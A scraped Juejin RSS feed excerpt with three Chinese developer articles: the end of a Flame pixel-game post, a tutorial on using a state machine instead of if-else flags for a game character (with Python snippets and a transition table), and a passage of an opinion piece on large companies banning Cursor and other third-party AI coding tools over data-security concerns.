<li><strong>角色与动画</strong>：使用精灵图 (<code>SpriteSheet</code>) 创建角色，支持 idle/run 等动画状态切换。</li>
<li><strong>玩家交互</strong>：通过摇杆控制角色移动，并根据方向翻转动画。</li>
<li><strong>地图加载</strong>：通过 <code>Tiled</code> 绘制并在 <strong>Flame</strong> 中加载的 <strong>2d像素地图</strong>。</li>
<li><strong>地图交互</strong>：通过组件化模式，新建了多个可供交互的组件如（<strong>门、钥匙、宝箱、地刺</strong>），为游戏增加了互动性。</li>
<li><strong>统一碰撞区检测</strong>：将角色与 <strong>需要产生碰撞</strong> 的物体统一管理，并实现碰撞时的 <strong>平滑侧移</strong>。</li>
</ul>
<h4 data-id="heading-40">展望</h4>
<ul>
<li>
<p>思考 🤔 一个有趣的游戏机制ing ...</p>
</li>
<li>
<p>完成攻击与技能系统，包括动画切换、攻击范围和远程弹道。</p>
</li>
<li>
<p>实现怪物生成、自动攻击与玩家碰撞逻辑。</p>
</li>
<li>
<p>支持局域网多玩家联机功能。</p>
</li>
</ul>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTheSyart%2Fmyhero" target="_blank" title="https://github.com/TheSyart/myhero" ref="nofollow noopener noreferrer">🚪 github 源码</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.shanchen.space" target="_blank" title="https://www.shanchen.space" ref="nofollow noopener noreferrer">💻 个人门户网站</a></p>
</blockquote>
<hr/>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48d840c0943b48dc974afc9d4952fefd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=GWSVzBzfNRh6Jy7VO4lICC%2FHyq4%3D" width="100%" loading="lazy"/></p><p/>
<p align="center"><i>之前尝试的Demo预览</i></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么你的if-else越写越乱？聊聊状态机]]></title>    <link>https://juejin.cn/post/7584037286028754994</link>    <guid>https://juejin.cn/post/7584037286028754994</guid>    <pubDate>2025-12-16T07:34:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584037286028754994" data-draft-id="7584110439932985390" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么你的if-else越写越乱？聊聊状态机"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-16T07:34:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dob"/> <meta itemprop="url" content="https://juejin.cn/user/3336393282826651"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么你的if-else越写越乱？聊聊状态机
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3336393282826651/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dob
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:34:19.000Z" title="Tue Dec 16 2025 07:34:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">状态机是什么？</h2>
<p>一句话定义：状态机：把对象的所有可能情况分成互斥的几种"状态"，明确规定状态之间如何切换。</p>
<p>本质上是对实际情况的一种分类讨论。</p>
<h2 data-id="heading-1">为什么需要状态机</h2>
<p>状态机解决的是：同一个对象，在不同状态下，对同一输入的不同响应问题。</p>
<p>想象一个游戏场景，你操作的角色需要进行不同的动作。
假设角色有这些状态：站立、跑步、跳跃、攻击、受击</p>
<p>刚开始的时候，你打算用if-else来解决</p>
<p>先来定义几个变量保存这些状态：</p>
<pre><code class="hljs language-python" lang="python">is_jumping = <span class="hljs-literal">False</span>
is_attacking = <span class="hljs-literal">False</span>
is_running = <span class="hljs-literal">False</span>
is_hurt = <span class="hljs-literal">False</span>
is_standing  = <span class="hljs-literal">False</span>

</code></pre>
<p>根据不同状态进行不同形态的攻击：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_attack_button</span>():
    <span class="hljs-keyword">if</span> is_jumping <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_attacking <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_hurt:
        do_air_attack()
    <span class="hljs-keyword">elif</span> is_running <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_attacking <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_hurt:
        do_dash_attack()
    <span class="hljs-keyword">elif</span> is_standing <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_attacking <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_hurt:
        do_normal_attack()
    <span class="hljs-comment"># 还要考虑29种其他组合的合理性</span>

</code></pre>
<p><strong>问题来了：</strong></p>
<ul>
<li>5个布尔变量，理论上有32（2^5）种组合</li>
<li>但"跳跃中同时受击同时攻击"合法吗？</li>
<li>每加一个状态，组合数翻倍</li>
<li>漏掉一个判断就出bug</li>
</ul>
<h2 data-id="heading-2">状态机要素</h2>
<p>状态机的要素分为4个要素，即：现态、条件、动作、次态。
“现态”和“条件”是因，“动作”和“次态”是果。</p>
<p>（1）现态：是指当前所处状态；<br/>
（2）条件：又称为“事件”。当条件被满足时，将会触发一个动作，或者执行一次状态的迁移。<br/>
（3）动作：条件满足后执行的动作。动作不是必须的，当条件满足后，也可以不执行任何动作，直接迁移到新状态。<br/>
（4）次态：条件满足后要迁移往的新状态。“次态”是相对于“现态”而言的，“次态”一旦被激活，就转变成新的“现态”了。</p>
<h2 data-id="heading-3">用状态机来解决这个问题</h2>
<p>核心思路：<strong>任何时刻，角色只能处于一个状态</strong></p>
<p>因此很自然的，我们定义一个变量表示角色的状态：</p>
<pre><code class="hljs language-python" lang="python">state = <span class="hljs-string">"站立"</span>  <span class="hljs-comment"># 只有一个变量</span>
</code></pre>
<p>从状态到状态的转换，我们也需要定义：</p>














































































































<table><thead><tr><th align="center">状态（现态）</th><th align="center">状态描述</th><th align="center">条件（事件）</th><th align="center">动作</th><th align="center">次态</th></tr></thead><tbody><tr><td align="center">站立</td><td align="center">默认待机状态</td><td align="center">按方向键</td><td align="center">播放跑步动画</td><td align="center">跑步</td></tr><tr><td align="center"/><td align="center"/><td align="center">按跳跃键</td><td align="center">播放跳跃动画</td><td align="center">跳跃</td></tr><tr><td align="center"/><td align="center"/><td align="center">按攻击键</td><td align="center">播放攻击动画</td><td align="center">攻击</td></tr><tr><td align="center"/><td align="center"/><td align="center">被打中</td><td align="center">播放受击动画</td><td align="center">受击</td></tr><tr><td align="center">跑步</td><td align="center">水平移动中</td><td align="center">松开方向键</td><td align="center">-</td><td align="center">站立</td></tr><tr><td align="center"/><td align="center"/><td align="center">按跳跃键</td><td align="center">播放跳跃动画</td><td align="center">跳跃</td></tr><tr><td align="center"/><td align="center"/><td align="center">按攻击键</td><td align="center">播放攻击动画</td><td align="center">攻击</td></tr><tr><td align="center"/><td align="center"/><td align="center">被打中</td><td align="center">播放受击动画</td><td align="center">受击</td></tr><tr><td align="center">跳跃</td><td align="center">空中状态</td><td align="center">落地</td><td align="center">-</td><td align="center">站立</td></tr><tr><td align="center"/><td align="center"/><td align="center">按攻击键</td><td align="center">播放空中攻击动画</td><td align="center">攻击</td></tr><tr><td align="center"/><td align="center"/><td align="center">被打中</td><td align="center">播放受击动画</td><td align="center">受击</td></tr><tr><td align="center">攻击</td><td align="center">攻击动作中</td><td align="center">动画结束</td><td align="center">-</td><td align="center">站立</td></tr><tr><td align="center"/><td align="center"/><td align="center">被打中</td><td align="center">播放受击动画</td><td align="center">受击</td></tr><tr><td align="center">受击</td><td align="center">受击硬直中</td><td align="center">硬直结束</td><td align="center">-</td><td align="center">站立</td></tr></tbody></table>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph 基础状态
        站立[站立]
        跑步[跑步]
    end
    
    subgraph 动作状态
        跳跃[跳跃]
        攻击[攻击]
        受击[受击]
    end
    
    站立 --&gt;|方向键| 跑步
    跑步 --&gt;|松开| 站立
    
    站立 --&gt;|跳跃键| 跳跃
    跑步 --&gt;|跳跃键| 跳跃
    跳跃 --&gt;|落地| 站立
    
    站立 --&gt;|攻击键| 攻击
    跑步 --&gt;|攻击键| 攻击
    跳跃 --&gt;|攻击键| 攻击
    攻击 --&gt;|动画结束| 站立
    
    站立 --&gt;|被打中| 受击
    跑步 --&gt;|被打中| 受击
    跳跃 --&gt;|被打中| 受击
    攻击 --&gt;|被打中| 受击
    受击 --&gt;|硬直结束| 站立

</code></pre>
<p>最后我们来实现不同形态的攻击（按攻击键）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_attack_button</span>():
    <span class="hljs-keyword">if</span> state == <span class="hljs-string">"站立"</span>:
	    <span class="hljs-comment"># 站立时的攻击</span>
        do_normal_attack()
        state = <span class="hljs-string">"攻击"</span>
    <span class="hljs-keyword">elif</span> state == <span class="hljs-string">"跑步"</span>:
	    <span class="hljs-comment"># 跑步时的攻击</span>
        do_dash_attack()
        state = <span class="hljs-string">"攻击"</span>
    <span class="hljs-keyword">elif</span> state == <span class="hljs-string">"跳跃"</span>:
	    <span class="hljs-comment"># 跳跃时的攻击</span>
        do_air_attack()
        state = <span class="hljs-string">"攻击"</span>
    <span class="hljs-comment"># 其他状态按攻击键无效，不用写</span>
</code></pre>
<h2 data-id="heading-4">对比</h2>

























<table><thead><tr><th/><th>布尔变量组合</th><th>状态机</th></tr></thead><tbody><tr><td>5个状态</td><td>最多32种组合要考虑</td><td>只有5种情况</td></tr><tr><td>加新状态</td><td>所有if都要检查</td><td>只加新状态的转换</td></tr><tr><td>非法情况</td><td>要手动排除</td><td>根本不存在</td></tr></tbody></table>
<h2 data-id="heading-5">总结</h2>
<p>代码的核心思路转变就是：</p>
<blockquote>
<p>从"用多个变量组合描述状态"到"用单一变量明确状态"</p>
</blockquote>
<p>核心难点是 如何定义状态 以做到互斥。</p>
<h3 data-id="heading-6"><strong>延伸</strong></h3>
<ul>
<li>状态很多时（几十个），考虑分层状态机</li>
<li>需要同时处于多个状态时，考虑并行状态机</li>
<li>实际项目中，状态机常用字典映射或状态模式实现，比if-elif更易维护</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[全面封禁 Cursor！又一家大厂出手了]]></title>    <link>https://juejin.cn/post/7584110439933100078</link>    <guid>https://juejin.cn/post/7584110439933100078</guid>    <pubDate>2025-12-16T07:43:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584110439933100078" data-draft-id="7584203412196671514" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="全面封禁 Cursor！又一家大厂出手了"/> <meta itemprop="keywords" content="Cursor,AI编程,程序员"/> <meta itemprop="datePublished" content="2025-12-16T07:43:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员鱼皮"/> <meta itemprop="url" content="https://juejin.cn/user/2444938365386621"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            全面封禁 Cursor！又一家大厂出手了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2444938365386621/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员鱼皮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:43:19.000Z" title="Tue Dec 16 2025 07:43:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是程序员鱼皮。</p>
<p>最近，有网友爆料称：<strong>快手的研发线发布通知，收紧了对第三方编程软件的使用权限</strong>。</p>
<p>不少同学发现，只要在自己办公电脑上点开 Cursor，就直接闪退，压根儿用不了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19b9b782d2874e92be66eef9f596c534~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=YO%2FV8SHOxRmR%2FS5W9da%2BOs7OYhA%3D" alt="" loading="lazy"/></p>
<p>我都能想象到这些同学有多痛苦，本来可能计划好了下午 1 个小时用 AI 把代码生成完，然后摸 5 个小时的鱼。结果午休一觉醒来发现天塌了，先是对着屏幕发了一会儿呆，然后开始上网找代码模板、翻文档查 API，能不能按时完成工作都是未知数。。。</p>
<p>有员工调侃：没 Cursor 的日子，我连 Hello World 都写不顺了！</p>
<p>毕竟很多人已经深度习惯了 AI 辅助开发，如果真的回到手搓时代，确实很难适应。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8eb421a361dd427d8c084db63f899082~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=wRXLj4rtPiQi%2FMlD%2Bi1d0GWO%2BZg%3D" alt="" loading="lazy"/></p>
<p>但其实这波限制第三方 AI 编程工具的操作，早就不是个例了。</p>
<p>今年 5 月，字节跳动就发布了内部邮件：自 6 月 30 日起，将分批次禁用 Cursor、Windsurf 等第三方 AI 编程软件，转而推广自研的编程助手 Trae。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0536bbdd10a4e60a2ceebce2c5c0c39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=1WgNsvEalXgyizSLtFKXz0dBf0Q%3D" alt="" loading="lazy"/></p>
<p>当时字节给出的理由主要有 2 个：</p>
<ol start="0">
<li>不少员工通过个人账户采购这些工具，数据沉淀到个人账户，不符合公司数据安全管理规范</li>
<li>部分第三方工具和模型（比如 Claude）尚未在中国区提供正式服务，存在合规风险</li>
</ol>
<p>结果这个消息在圈内传得沸沸扬扬，尤其是字节的程序员炸锅了。有人觉得毕竟字节要推自己的 Trae 嘛，禁用第三方工具也算是情理之中。但关键是当时 TRAE 和 Cursor 差距较大，所以有厂友吐槽：如果逼着用Trae，那宁可不用AI。天天在那里提示纯属帮倒忙，不仅降低生产力还影响心情。</p>
<p>还有更狠的 DISS：外面的蟠桃不给吃，逼着让吃自家的猪饲料。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dd257e3dd9e4188855619b587c0f3cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=UlBOsBZuhqWqKD%2BLHGgzj%2BbI1a0%3D" alt="" loading="lazy"/></p>
<p>后来字节又补充说明，如果第三方工具符合法律法规、支持租户管理和数据管控，通过审核后还是可以申请使用的。只不过大部分人都被引导去用 Trae 了。</p>
<p>除了国内大厂，像亚马逊在今年 11 月要求员工优先使用自研的 AI 编程工具 Kiro，并明确表示将不再支持任何新增的第三方 AI 开发工具。还有今年 9 月，微软全面禁止员工使用 DeepSeek 相关应用，强制推广自家的 GitHub Copilot。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30cb57db6b134d1ca51a207d86e138ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=1xQwjFZwHuiYCmgGP7T66lkIlTM%3D" alt="" loading="lazy"/></p>
<p>看到这里你可能会想，这些大厂是不是太保守了？AI 编程工具明明能大幅提升效率，为啥要禁？真的只是为了推广自家的产品么？</p>
<p>我觉得首要原因是 <strong>考虑安全性</strong>。</p>
<p>对于大厂来说，代码不仅仅是代码，更是企业的核心资产、是商业机密。一旦泄露，损失无法估量。</p>
<p>而 Cursor、Copilot 这类 AI 编程工具，默认会将用户输入发送至云端模型进行推理。你写的每一行注释、每一段未提交的草稿，都可能在不经意间离开企业边界。</p>
<p>再仔细想一想，这些工具背后的大模型训练数据来自哪里？会不会用你的代码继续训练？这些问题都是大厂必须考虑的。</p>
<p>能用 AI 开发都已经算是好的了，有些公司对安全的把控更严格，比如位于深圳的 ICT、计算头部企业，一直秉持着 <strong>内部信息不上网</strong> 的原则。任何向外部网络上传文件的行为，都被从底层程序上禁止了。</p>
<p>想象一下，明明外面的世界如此发达，却要把你关在一个禁网的小黑屋里写代码，这才是真的痛苦。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95bc70bc5e0d4999994d113a8dbaa1c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766475798&amp;x-signature=9nEX9JORmYZnBzYUc2dHftYqsNE%3D" alt="" loading="lazy"/></p>
<p>除了数据安全，还有个现实问题：<strong>AI 生成的代码质量参差不齐</strong>。</p>
